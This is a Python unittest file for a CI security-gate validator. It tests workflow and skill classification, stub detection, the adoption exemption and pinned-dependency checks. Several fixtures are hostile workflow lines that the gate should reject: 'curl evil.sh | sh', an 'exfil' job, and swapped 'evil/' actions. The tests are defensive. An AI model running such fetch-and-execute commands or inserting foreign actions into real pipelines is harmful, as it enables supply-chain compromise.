#!/usr/bin/env python3
"""Tests for the SDL validator. Stdlib only — run with:

    python3 lib/test_validate.py        # or: python3 -m unittest -v

No third-party dependencies, so CI runs it with a bare Python.
"""

import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))
import validate as v  # noqa: E402


def P(s: str) -> Path:
    return Path(s)


class ClassifyFiles(unittest.TestCase):
    """is_workflow / is_skill / code_changed — the gate-widening logic."""

    def test_workflow_files_are_executable(self):
        for path in (
            ".github/workflows/sdl.yml",
            ".github/workflows/release.yaml",
            ".github/actions/setup/action.yml",
            "vendor/foo/action.yaml",  # a published action can live anywhere
            "action.yml",
        ):
            self.assertTrue(v.is_workflow(P(path)), path)

    def test_non_workflow_yaml_is_not(self):
        for path in (
            "config/app.yaml",
            "docker-compose.yml",
            ".github/dependabot.yml",       # configures Dependabot, runs no steps
            ".github/ISSUE_TEMPLATE/bug.yml",
        ):
            self.assertFalse(v.is_workflow(P(path)), path)

    def test_skill_files_are_executable(self):
        for path in (
            "skills/sdl-review/SKILL.md",
            "skills/sdl-review/security-checks.md",  # skill-bundled behavior
            "plugins/sdl/skills/sdl-spec/SKILL.md",  # symlinked tree
            "SKILL.md",
        ):
            self.assertTrue(v.is_skill(P(path)), path)

    def test_ordinary_and_artifact_markdown_is_not_a_skill(self):
        for path in (
            "README.md",
            "docs/developer-guide.md",
            "templates/docs-sdl/02-threat-model.md",
            "docs/sdl/2026-05-14-x/02-threat-model.md",  # an SDL artifact
            "docs/sdl/baseline.md",
        ):
            self.assertFalse(v.is_skill(P(path)), path)

    def test_code_changed_union(self):
        self.assertTrue(v.code_changed([P("lib/validate.py")]))
        self.assertTrue(v.code_changed([P("scripts/install.sh")]))
        self.assertTrue(v.code_changed([P(".github/workflows/sdl.yml")]))
        self.assertTrue(v.code_changed([P("skills/x/SKILL.md")]))
        # Mixed: one code file among docs still gates.
        self.assertTrue(v.code_changed([P("README.md"), P("action.yml")]))

    def test_code_changed_docs_only_does_not_gate(self):
        self.assertFalse(
            v.code_changed([P("README.md"), P("docs/admin-setup.md"), P("config/app.yaml")])
        )
        self.assertFalse(v.code_changed([]))


class CurrentBranch(unittest.TestCase):
    """Branch detection must survive the detached-HEAD checkout of PR events."""

    def test_prefers_github_head_ref(self):
        # pull_request event: HEAD is detached, but GITHUB_HEAD_REF names the
        # source branch. git would return "HEAD" here, so the env must win.
        with mock.patch.dict(os.environ, {"GITHUB_HEAD_REF": "feature/login"}):
            with mock.patch.object(v, "run", return_value="HEAD\n"):
                self.assertEqual(v.current_branch(), "feature/login")

    def test_falls_back_to_git_when_unset(self):
        # push event / local run: no GITHUB_HEAD_REF, trust git.
        with mock.patch.dict(os.environ, {}, clear=True):
            with mock.patch.object(v, "run", return_value="main\n"):
                self.assertEqual(v.current_branch(), "main")

    def test_blank_head_ref_falls_back(self):
        # GITHUB_HEAD_REF is defined-but-empty on push events.
        with mock.patch.dict(os.environ, {"GITHUB_HEAD_REF": ""}):
            with mock.patch.object(v, "run", return_value="dev\n"):
                self.assertEqual(v.current_branch(), "dev")


class IsNonstub(unittest.TestCase):
    """is_nonstub — the heuristic that previously misread multi-line comments."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def write(self, name: str, text: str) -> Path:
        p = self.dir / name
        p.write_text(text, encoding="utf-8")
        return p

    def test_byte_equal_to_template_is_stub(self):
        tmpl = self.write("tmpl.md", "# Title\n\nReal content here.\n")
        same = self.write("same.md", "# Title\n\nReal content here.\n")
        self.assertFalse(v.is_nonstub(same, tmpl))

    def test_multiline_comment_only_is_stub(self):
        # Regression: comment body lines must not count as content.
        f = self.write(
            "stub.md",
            "# Heading\n\n<!--\nFill this in:\n- asset touched\n- trust boundary\n-->\n",
        )
        self.assertFalse(v.is_nonstub(f, None))

    def test_single_line_comments_are_stub(self):
        f = self.write("stub.md", "# Heading\n\n<!-- guidance -->\n<!-- more -->\n")
        self.assertFalse(v.is_nonstub(f, None))

    def test_headers_tables_rules_only_is_stub(self):
        f = self.write(
            "stub.md",
            "# Title\n## Section\n\n| Col | Col |\n| --- | --- |\n\n---\n",
        )
        self.assertFalse(v.is_nonstub(f, None))

    def test_prose_line_is_content(self):
        f = self.write(
            "filled.md",
            "# Heading\n\n<!-- guidance -->\nThis change adds an endpoint.\n",
        )
        self.assertTrue(v.is_nonstub(f, None))

    def test_content_after_closing_comment_is_detected(self):
        f = self.write(
            "filled.md",
            "<!--\nmulti\nline\n-->\nActual prose follows the comment.\n",
        )
        self.assertTrue(v.is_nonstub(f, None))

    def test_differs_from_template_but_still_stub(self):
        tmpl = self.write("tmpl.md", "# Title\n<!-- fill me -->\n")
        cyc = self.write("cyc.md", "# Title\n<!-- fill me, edited hint -->\n")
        self.assertFalse(v.is_nonstub(cyc, tmpl))


class CycleChecks(unittest.TestCase):
    """File-backed checks against a synthetic docs/sdl/ tree."""

    ARTIFACTS = ("01-requirements.md", "02-threat-model.md",
                 "03-implementation.md", "04-verification.md")

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.repo = Path(self._tmp.name)
        self.sdl = self.repo / "docs" / "sdl"
        self.sdl.mkdir(parents=True)

    def tearDown(self):
        self._tmp.cleanup()

    def make_cycle(self, slug: str, branch: str, *, filled: bool = True,
                   artifacts: bool = True) -> Path:
        cyc = self.sdl / slug
        cyc.mkdir()
        (cyc / ".sdl-meta.yml").write_text(f"slug: {slug}\nbranch: {branch}\n", "utf-8")
        if artifacts:
            body = "Real reviewed content.\n" if filled else "<!-- fill me -->\n"
            for f in self.ARTIFACTS:
                (cyc / f).write_text(f"# {f}\n\n{body}", "utf-8")
        return cyc

    def test_find_cycle_for_branch(self):
        cyc = self.make_cycle("2026-06-10-feature", "feature/login")
        self.assertEqual(v.find_cycle_for_branch(self.repo, "feature/login"), cyc)
        self.assertIsNone(v.find_cycle_for_branch(self.repo, "other-branch"))

    def test_find_cycle_no_sdl_dir(self):
        empty = Path(self._tmp.name) / "nope"
        self.assertIsNone(v.find_cycle_for_branch(empty, "any"))

    def test_check_cycle_present(self):
        files = [P("lib/x.py")]
        with mock.patch.object(v, "added_files", return_value=set()):
            self.assertFalse(v.check_cycle_present(self.repo, "feature/login", files, "origin/main", None))
            self.make_cycle("2026-06-10-feature", "feature/login")
            self.assertTrue(v.check_cycle_present(self.repo, "feature/login", files, "origin/main", None))

    def test_check_cycle_present_docs_only_passes_without_cycle(self):
        self.assertTrue(
            v.check_cycle_present(self.repo, "feature/login", [P("README.md")], "origin/main", None)
        )

    def test_check_files_present(self):
        cyc = self.make_cycle("c", "b")
        self.assertTrue(v.check_files_present(cyc))
        (cyc / "02-threat-model.md").unlink()
        self.assertFalse(v.check_files_present(cyc))

    def test_check_nonstub(self):
        filled = self.make_cycle("filled", "b1", filled=True)
        self.assertTrue(v.check_nonstub(filled, None))
        stub = self.make_cycle("stub", "b2", filled=False)
        self.assertFalse(v.check_nonstub(stub, None))

    def test_check_meta_branch(self):
        cyc = self.make_cycle("c", "feature/x")
        self.assertTrue(v.check_meta_branch(cyc, "feature/x"))
        self.assertFalse(v.check_meta_branch(cyc, "feature/y"))

    def test_baseline_warning(self):
        # Missing baseline.
        self.assertIn("no docs/sdl/baseline.md", v.baseline_warning(self.repo))
        # Stub baseline.
        (self.sdl / "baseline.md").write_text("# Baseline\n\n<!-- fill me -->\n", "utf-8")
        self.assertIn("stub", v.baseline_warning(self.repo))
        # Filled baseline.
        (self.sdl / "baseline.md").write_text("# Baseline\n\nStanding exposure model.\n", "utf-8")
        self.assertIsNone(v.baseline_warning(self.repo))


CALLER_WORKFLOW = """name: sdl
on:
  pull_request:
  push:
    branches: [main]
jobs:
  validate:
    uses: savioke/sdl/.github/workflows/sdl-validate.yml@v1
"""


class AdoptionDiff(unittest.TestCase):
    """The repo's first SDL PR installs the gate and authors the baseline, and
    has no cycle by construction. The exemption is deliberately unavailable to
    every later PR — widening it is a gate-softening change."""

    ADOPTION_FILES = [P(".github/workflows/sdl.yml"), P("docs/sdl/baseline.md"),
                      P("docs/sdl/.gitkeep")]
    ADDED = {".github/workflows/sdl.yml", "docs/sdl/baseline.md", "docs/sdl/.gitkeep"}

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.repo = Path(self._tmp.name)
        (self.repo / "docs" / "sdl").mkdir(parents=True)
        (self.repo / ".github" / "workflows").mkdir(parents=True)
        self.write_workflow(CALLER_WORKFLOW)
        self.write_baseline("# SDL Baseline\n\nSingle operator, trusted workstation.\n")

    def tearDown(self):
        self._tmp.cleanup()

    def write_workflow(self, text: str):
        (self.repo / ".github" / "workflows" / "sdl.yml").write_text(text, "utf-8")

    def write_baseline(self, text: str):
        (self.repo / "docs" / "sdl" / "baseline.md").write_text(text, "utf-8")

    def check(self, files=None, added=None):
        with mock.patch.object(v, "added_files", return_value=added or self.ADDED):
            return v.check_adoption(self.repo, "origin/main", files or self.ADOPTION_FILES, None)

    def test_adoption_diff_passes_without_a_cycle(self):
        self.assertTrue(self.check())

    def test_gate_passes_end_to_end(self):
        with mock.patch.object(v, "added_files", return_value=self.ADDED):
            self.assertTrue(
                v.check_cycle_present(self.repo, "enroll-in-sdl", self.ADOPTION_FILES,
                                      "origin/main", None)
            )

    def test_stub_baseline_fails_with_a_pointed_message(self):
        self.write_baseline("# SDL Baseline\n\n<!-- fill me -->\n")
        r = self.check()
        self.assertFalse(r)
        self.assertIn("sdl-baseline", r.msg)

    def test_code_alongside_adoption_still_needs_a_cycle(self):
        self.assertIsNone(self.check(files=self.ADOPTION_FILES + [P("lib/app.py")]))

    def test_another_workflow_alongside_adoption_still_needs_a_cycle(self):
        self.assertIsNone(
            self.check(files=self.ADOPTION_FILES + [P(".github/workflows/release.yml")])
        )

    def test_modified_not_added_workflow_is_not_adoption(self):
        # The one-shot hinge: a repo that already has sdl.yml cannot reach the
        # exemption by re-adding a baseline.
        added = self.ADDED - {".github/workflows/sdl.yml"}
        self.assertIsNone(self.check(added=added))

    def test_existing_baseline_is_not_adoption(self):
        self.assertIsNone(self.check(added=self.ADDED - {"docs/sdl/baseline.md"}))

    def test_workflow_carrying_inline_steps_fails(self):
        self.write_workflow(CALLER_WORKFLOW + "  exfil:\n    steps:\n      - run: curl evil.sh\n")
        r = self.check()
        self.assertFalse(r)
        self.assertIn("generated SDL caller", r.msg)

    def test_workflow_calling_a_foreign_action_fails(self):
        self.write_workflow(CALLER_WORKFLOW + "  other:\n    steps:\n      - uses: evil/action@v1\n")
        self.assertFalse(self.check())

    def test_workflow_with_no_caller_fails(self):
        self.write_workflow("name: sdl\non: pull_request\njobs: {}\n")
        self.assertFalse(self.check())


PIN_OLD = "        uses: actions/checkout@" + "a" * 40 + " # v6.0.3"
PIN_NEW = "        uses: actions/checkout@" + "b" * 40 + " # v6.1.0"
PIN_MAJOR = "        uses: actions/checkout@" + "c" * 40 + " # v7.0.0"


def fake_diff(*lines: str) -> str:
    return "\n".join(
        ["diff --git a/w.yml b/w.yml", "index 000..111 100644",
         "--- a/w.yml", "+++ b/w.yml", "@@ -1 +1 @@", *lines]
    )


class DependencyClassifier(unittest.TestCase):
    """Fail-closed classification of dependency-update diffs (T1 of cycle
    2026-07-09-dep-update-tier). Rejection cases are pinned here on purpose:
    widening them is a gate-softening change and must be deliberate."""

    def test_manifests_by_exact_name(self):
        for path in ("package-lock.json", "sub/dir/go.sum", "Cargo.lock",
                     "requirements.txt", ".github/dependabot.yml"):
            self.assertTrue(v.is_dep_manifest(P(path)), path)

    def test_non_manifests_rejected(self):
        for path in ("lib/validate.py", "package.json.bak", "dependabot.yml",
                     "requirements.txt.in", "docs/go.sum.md"):
            self.assertFalse(v.is_dep_manifest(P(path)), path)

    def _pin_only(self, diff: str) -> v.Result:
        with mock.patch.object(v, "run", return_value=diff):
            return v.pin_only_workflow_diff("origin/main", P("w.yml"))

    def test_pin_bump_same_major_accepted(self):
        self.assertTrue(self._pin_only(fake_diff("-" + PIN_OLD, "+" + PIN_NEW)))

    def test_major_bump_rejected(self):
        r = self._pin_only(fake_diff("-" + PIN_OLD, "+" + PIN_MAJOR))
        self.assertFalse(r)
        self.assertIn("major", r.msg)

    def test_swapped_action_rejected(self):
        # Same pin shape, different action: the classic T1 bypass attempt.
        evil = PIN_NEW.replace("actions/checkout", "evil/checkout")
        r = self._pin_only(fake_diff("-" + PIN_OLD, "+" + evil))
        self.assertFalse(r)
        self.assertIn("new action", r.msg)

    def test_new_action_without_counterpart_rejected(self):
        self.assertFalse(self._pin_only(fake_diff("+" + PIN_NEW)))

    def test_removed_action_without_counterpart_rejected(self):
        # Deleting a single-line uses: step is a CI behavior change.
        r = self._pin_only(fake_diff("-" + PIN_OLD))
        self.assertFalse(r)
        self.assertIn("removed", r.msg)

    def test_unpinned_ref_rejected(self):
        r = self._pin_only(fake_diff("-" + PIN_OLD, "+        uses: actions/checkout@v6 # v6.1.0"))
        self.assertFalse(r)

    def test_missing_version_comment_rejected(self):
        bare = "+        uses: actions/checkout@" + "b" * 40
        self.assertFalse(self._pin_only(fake_diff("-" + PIN_OLD, bare)))

    def test_non_pin_line_rejected(self):
        r = self._pin_only(fake_diff("-" + PIN_OLD, "+" + PIN_NEW, "+      - run: curl evil.sh | sh"))
        self.assertFalse(r)
        self.assertIn("non-pin", r.msg)

    def test_removed_yaml_separator_is_not_mistaken_for_header(self):
        # "-" + "---" must be treated as a (rejected) content change, not a
        # diff file header.
        self.assertFalse(self._pin_only(fake_diff("----", "+" + PIN_NEW)))

    def test_reusable_workflow_and_subdir_paths_match(self):
        line = "    uses: savioke/sdl/.github/workflows/x.yml@" + "d" * 40 + " # v1.2.0"
        m = v.PIN_LINE_RE.match(line)
        self.assertIsNotNone(m)
        self.assertEqual(m.group("action"), "savioke/sdl")

    def test_whole_diff_classification(self):
        files = [P("package-lock.json"), P("docs/sdl/2026-07-09-x/dep-update.md")]
        self.assertTrue(v.check_dep_class_diff("origin/main", files))
        files.append(P("lib/validate.py"))
        r = v.check_dep_class_diff("origin/main", files)
        self.assertFalse(r)
        self.assertIn("full cycle", r.msg)


class DependencyRecord(unittest.TestCase):
    """check_dep_record — the routine-tier evidence file."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.cycle = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def write_record(self, table_rows: str) -> None:
        (self.cycle / "dep-update.md").write_text(
            "# Dependency update record\n\nUpdates verified.\n\n"
            "| package | from | to | source |\n|---|---|---|---|\n"
            + table_rows, "utf-8"
        )

    def test_missing_record_fails(self):
        self.assertFalse(v.check_dep_record(self.cycle, None))

    def test_minor_bump_passes(self):
        self.write_record("| actions/setup-python | v6.2.0 | v6.3.0 | dependabot |\n")
        self.assertTrue(v.check_dep_record(self.cycle, None))

    def test_major_bump_fails(self):
        self.write_record("| actions/checkout | v6.0.3 | v7.0.0 | dependabot |\n")
        r = v.check_dep_record(self.cycle, None)
        self.assertFalse(r)
        self.assertIn("major", r.msg)

    def test_versions_without_v_prefix(self):
        self.write_record("| lodash | 4.17.20 | 4.17.21 | dependabot |\n")
        self.assertTrue(v.check_dep_record(self.cycle, None))

    def test_unparseable_version_fails(self):
        self.write_record("| mystery | old | new | hand |\n")
        self.assertFalse(v.check_dep_record(self.cycle, None))

    def test_empty_table_fails(self):
        self.write_record("")
        r = v.check_dep_record(self.cycle, None)
        self.assertFalse(r)
        self.assertIn("declares no updates", r.msg)


class CycleClass(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.cycle = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def test_class_parsed(self):
        (self.cycle / ".sdl-meta.yml").write_text(
            "slug: s\nbranch: b\nclass: dependency-update\n", "utf-8")
        self.assertEqual(v.cycle_class(self.cycle), "dependency-update")

    def test_absent_class_is_none(self):
        (self.cycle / ".sdl-meta.yml").write_text("slug: s\nbranch: b\n", "utf-8")
        self.assertIsNone(v.cycle_class(self.cycle))


if __name__ == "__main__":
    unittest.main()
